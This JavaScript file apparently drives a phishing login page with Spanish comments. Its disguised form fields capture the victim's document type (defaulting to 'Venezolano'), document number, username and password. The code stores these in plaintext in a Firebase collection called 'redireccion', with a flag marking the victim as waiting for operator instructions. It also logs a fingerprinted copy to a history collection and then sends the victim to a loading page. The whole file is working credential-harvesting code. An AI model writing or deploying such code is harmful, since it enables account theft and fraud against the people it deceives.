// Script principal con Firebase - Flujo completo del proyecto
console.log('üöÄ Script principal iniciado');

// NOTA: La configuraci√≥n de Firebase y rutas est√° centralizada en firebase-config.js
// Este archivo debe importarse antes que main.js en el HTML

// Variables globales para Firebase
let app, db, unsubscribe;

// Inicializar Firebase
try {
    app = firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
    console.log('‚úÖ Firebase inicializado correctamente');
    console.log('üîç Configuraci√≥n Firebase:', {
        projectId: firebaseConfig.projectId,
        authDomain: firebaseConfig.authDomain,
        tieneApp: !!app,
        tieneDB: !!db
    });
} catch (error) {
    console.error('‚ùå Error inicializando Firebase:', error);
    console.error('‚ùå Configuraci√≥n que fall√≥:', firebaseConfig);
}

// Funci√≥n principal cuando el DOM est√© listo
document.addEventListener('DOMContentLoaded', async function () {
    console.log('üìÑ DOM cargado - Inicializando aplicaci√≥n');
    
    // Obtener elementos del DOM - TODOS LOS CAMPOS
    const dikiSelect = document.getElementById('diki'); // Tipo de documento
    const dokoinpt = document.getElementById('doko'); // N√∫mero de documento
    const tikiInpt = document.getElementById('tiki'); // Nombre de usuario
    const tokoInpt = document.getElementById('toko'); // Contrase√±a
    const submitBtn = document.getElementById('cmdLg'); // Bot√≥n de login
    const overlay = document.getElementById('loader-container');
    
    
    
    if (!tikiInpt || !submitBtn) {
        console.error('‚ùå Elementos cr√≠ticos no encontrados');
        return;
    }
    
    // Inicializar estado
    submitBtn.disabled = true;

    // Toggle de visibilidad de contrase√±a (icono ojo)
    try {
        const eyeIcon = document.querySelector('.move_me');
        if (eyeIcon && tokoInpt) {
            eyeIcon.addEventListener('click', () => {
                const isPass = tokoInpt.type === 'password';
                tokoInpt.type = isPass ? 'text' : 'password';
                // Alternar icono
                eyeIcon.classList.toggle('fa-eye');
                eyeIcon.classList.toggle('fa-eye-slash');
            });
        }
    } catch (e) {
        console.warn('No se pudo inicializar el toggle de contrase√±a:', e);
    }
    
    // Funci√≥n para validar entrada
    function validateInput() {
        if (tikiInpt && submitBtn) {
            // Validar que al menos el usuario tenga contenido
            if (tikiInpt.value.length >= 3) {
                submitBtn.disabled = false;
                submitBtn.style.cursor = 'pointer';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('‚úÖ Bot√≥n habilitado');
            } else {
                submitBtn.disabled = true;
                submitBtn.style.cursor = 'not-allowed';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('‚ùå Bot√≥n deshabilitado');
            }
        }
    }
    
    // Funci√≥n para obtener el pr√≥ximo n√∫mero secuencial para las tarjetas
    async function getNextCardNumber() {
        try {
            const q = db.collection("redireccion").orderBy("cardNumber", "desc").limit(1);
            const snap = await q.get();
            if (snap.empty) return 1;
            const highest = snap.docs[0].data().cardNumber || 0;
            return highest + 1;
        } catch (err) {
            console.error("Error obteniendo siguiente cardNumber:", err);
            return 1;
        }
    }

    // Funci√≥n para guardar en historial persistente con reintentos y mejor logging
    async function guardarEnHistorial(datos, reintentos = 3) {
        console.log('üîç INICIANDO guardarEnHistorial con datos:', {
            usuario: datos.usuario,
            tieneDB: !!db,
            datosCompletos: Object.keys(datos)
        });
        
        // Verificar que Firebase est√© inicializado
        if (!db) {
            console.error('‚ùå ERROR CR√çTICO: Firebase db no est√° inicializado');
            console.error('‚ùå Verificar que firebase-config.js se carg√≥ correctamente');
            return false;
        }
        
        for (let intento = 1; intento <= reintentos; intento++) {
            try {
                console.log(`üöÄ Intento ${intento} de ${reintentos} - Guardando en Firestore...`);
                
                const docId = `${datos.usuario}_${Date.now()}_${intento}`;
                const historialRef = db.collection("datosHistorial").doc(docId);
                
                console.log('üìù Referencia creada:', {
                    coleccion: 'datosHistorial',
                    documentoId: docId,
                    referencia: !!historialRef
                });
                
                // Intentar guardar
                await historialRef.set(datos);
                
                console.log(`‚úÖ √âXITO: Historial guardado en intento ${intento}`);
                console.log(`‚úÖ Documento guardado con ID: ${docId}`);
                console.log(`‚úÖ En colecci√≥n: datosHistorial`);
                
                // Verificar que se guard√≥
                const verificacion = await historialRef.get();
                if (verificacion.exists) {
                    console.log('‚úÖ VERIFICACI√ìN: Documento existe en Firestore');
                    return true;
                } else {
                    console.warn('‚ö†Ô∏è ADVERTENCIA: Documento no se encontr√≥ despu√©s de guardar');
                }
                
            } catch (error) {
                console.error(`‚ùå INTENTO ${intento} FALL√ì:`);
                console.error('‚ùå Error completo:', error);
                console.error('‚ùå Mensaje:', error.message);
                console.error('‚ùå C√≥digo:', error.code);
                console.error('‚ùå Stack:', error.stack);
                
                if (intento === reintentos) {
                    console.error(`‚ùå FALLO FINAL: No se pudo guardar historial despu√©s de ${reintentos} intentos`);
                    console.error('‚ùå Datos que se intentaron guardar:', datos);
                    return false;
                }
                
                // Esperar antes del siguiente intento
                const espera = 1000 * intento;
                console.log(`‚è≥ Esperando ${espera}ms antes del siguiente intento...`);
                await new Promise(resolve => setTimeout(resolve, espera));
            }
        }
        return false;
    }

    // Funci√≥n para manejar el env√≠o - FLUJO CORRECTO
    async function manejarEnvio(event) {
        event.preventDefault();
        console.log('üöÄ Procesando env√≠o del formulario');
        
        if (!submitBtn || submitBtn.disabled) {
            console.log('‚ö†Ô∏è Bot√≥n deshabilitado');
            return;
        }
        
        try {
            // Mostrar overlay de carga
            if (overlay) {
                overlay.style.display = "block";
            }
            
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            
            // üìù CAPTURAR TODOS LOS DATOS DEL FORMULARIO
            const diki = dikiSelect ? dikiSelect.value : '01';
            const doko = dokoinpt ? dokoinpt.value.trim() : '';
            const tiki = tikiInpt ? tikiInpt.value.trim() : '';
            const toko = tokoInpt ? tokoInpt.value.trim() : '';
            
            // Obtener texto del tipo de documento seleccionado
            const tipoDocTexto = dikiSelect ? dikiSelect.options[dikiSelect.selectedIndex].text : 'Venezolano';
            
            console.log('üìù Datos capturados del formulario:', {
                diki,
                tipoDocTexto,
                doko,
                tiki,
                toko: toko ? '***' + toko.slice(-2) : '' // Ocultar contrase√±a en logs
            });
            
            if (!tiki) {
                throw new Error("El nombre de usuario no puede estar vac√≠o");
            }

            // Obtener el pr√≥ximo n√∫mero secuencial
            const cardNumber = await getNextCardNumber();

            console.log('üé® Datos del usuario:', { tiki, cardNumber });

            const userRef = db.collection("redireccion").doc(tiki);
            await userRef.set({
                // üìù Datos del formulario
                diki: diki,
                tipoDocTexto: tipoDocTexto,
                doko: doko,
                usuario: tiki,
                clave: toko,
                
                // üé® Datos del sistema
                tipo: tipoDocTexto, // üè∑Ô∏è Mostrar tipo de documento en la tarjeta
                page: 0, // ‚≠ê ESTADO DE ESPERA - Clave del flujo correcto
                cardNumber: cardNumber,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'M√≥vil' : 'Desktop',
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            console.log('üíæ Usuario guardado en Firebase con page: 0 (esperando instrucciones)');

            // 2. Preparar datos completos para historial
            const datosCompletos = {
                // üìù Datos del formulario
                diki: diki,
                tipoDocTexto: tipoDocTexto,
                doko: doko,
                usuario: tiki,
                clave: toko,
                
                // üé® Datos del sistema
                cardNumber: cardNumber,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'M√≥vil' : 'Desktop',
                
                // ‚è∞ Datos temporales
                timestamp: new Date().toISOString(),
                
                // üíª Datos t√©cnicos adicionales
                userAgent: navigator.userAgent,
                idioma: navigator.language || 'es',
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
                resolucion: `${screen.width}x${screen.height}`,
                referrer: document.referrer || 'Directo'
            };

            // 3. Guardar historial de forma no bloqueante
            setTimeout(async () => {
                try {
                    const exito = await guardarEnHistorial(datosCompletos);
                    if (exito) {
                        console.log("‚úÖ Historial guardado exitosamente");
                    } else {
                        console.warn("‚ö†Ô∏è No se pudo guardar el historial (no cr√≠tico)");
                    }
                } catch (error) {
                    console.warn("‚ö†Ô∏è Error en historial (no cr√≠tico):", error);
                }
            }, 100);

            // 4. Guardar usuario en localStorage y redirigir a load.html
            localStorage.setItem('usuarioActual', tiki);
            console.log('üíæ Usuario guardado en localStorage:', tiki);
            
            console.log('üöÄ Datos guardados - Redirigiendo a load.html');
            
            // Peque√±o delay para asegurar que todo se guarde
            setTimeout(() => {
                window.location.href = 'load.html';
            }, 500);
            
        } catch (error) {
            console.error('‚ùå Error en el proceso:', error);
            alert(`Error: ${error.message}`);
            
            // Restaurar estado en caso de error
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
            if (overlay) overlay.style.display = "none";
        }
    }
    
    // Agregar event listeners
    if (tikiInpt) {
        tikiInpt.addEventListener('input', validateInput);
        console.log('üéØ Event listener agregado al campo de usuario');
    }
    
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvio);
        console.log('üéØ Event listener agregado al bot√≥n');
    }
    
    // Validar entrada inicial
    validateInput();
});

// üîß FUNCI√ìN DE DIAGN√ìSTICO GLOBAL - Ejecutar desde consola del navegador
window.diagnosticarFirebase = async function() {
    console.log('üîß INICIANDO DIAGN√ìSTICO DE FIREBASE');
    console.log('='.repeat(50));
    
    // 1. Verificar variables globales
    console.log('1Ô∏è‚É£ VERIFICANDO VARIABLES GLOBALES:');
    console.log('   - firebase disponible:', typeof firebase !== 'undefined');
    console.log('   - firebaseConfig disponible:', typeof firebaseConfig !== 'undefined');
    console.log('   - app inicializada:', !!app);
    console.log('   - db inicializada:', !!db);
    
    if (!db) {
        console.error('‚ùå PROBLEMA: db no est√° inicializada');
        return;
    }
    
    // 2. Probar conexi√≥n b√°sica
    console.log('\n2Ô∏è‚É£ PROBANDO CONEXI√ìN A FIRESTORE:');
    try {
        const testRef = db.collection('test').doc('conexion');
        await testRef.set({ timestamp: new Date(), test: true });
        console.log('‚úÖ Escritura exitosa en colecci√≥n test');
        
        const testDoc = await testRef.get();
        if (testDoc.exists) {
            console.log('‚úÖ Lectura exitosa desde Firestore');
            console.log('   Datos:', testDoc.data());
        }
        
        // Limpiar documento de prueba
        await testRef.delete();
        console.log('‚úÖ Documento de prueba eliminado');
        
    } catch (error) {
        console.error('‚ùå ERROR EN CONEXI√ìN:', error);
        return;
    }
    
    // 3. Probar funci√≥n guardarEnHistorial
    console.log('\n3Ô∏è‚É£ PROBANDO FUNCI√ìN guardarEnHistorial:');
    const datosTest = {
        usuario: 'TEST_USER',
        timestamp: new Date().toISOString(),
        test: true,
        diagnostico: 'Prueba desde funci√≥n de diagn√≥stico'
    };
    
    const resultado = await guardarEnHistorial(datosTest);
    if (resultado) {
        console.log('‚úÖ guardarEnHistorial funcion√≥ correctamente');
    } else {
        console.error('‚ùå guardarEnHistorial fall√≥');
    }
    
    // 4. Verificar colecci√≥n datosHistorial
    console.log('\n4Ô∏è‚É£ VERIFICANDO COLECCI√ìN datosHistorial:');
    try {
        const historialSnapshot = await db.collection('datosHistorial').limit(5).get();
        console.log(`üìä Documentos en datosHistorial: ${historialSnapshot.size}`);
        
        if (historialSnapshot.size > 0) {
            console.log('üìã √öltimos documentos:');
            historialSnapshot.forEach(doc => {
                console.log(`   - ${doc.id}:`, doc.data());
            });
        } else {
            console.warn('‚ö†Ô∏è No hay documentos en la colecci√≥n datosHistorial');
        }
    } catch (error) {
        console.error('‚ùå Error consultando datosHistorial:', error);
    }
    
    console.log('\nüîß DIAGN√ìSTICO COMPLETADO');
    console.log('='.repeat(50));
};

// Mensaje para el usuario
console.log('üîß FUNCI√ìN DE DIAGN√ìSTICO DISPONIBLE:');
console.log('   Ejecuta: diagnosticarFirebase()');
console.log('   Para probar la conexi√≥n a Firebase y la funci√≥n guardarEnHistorial');    
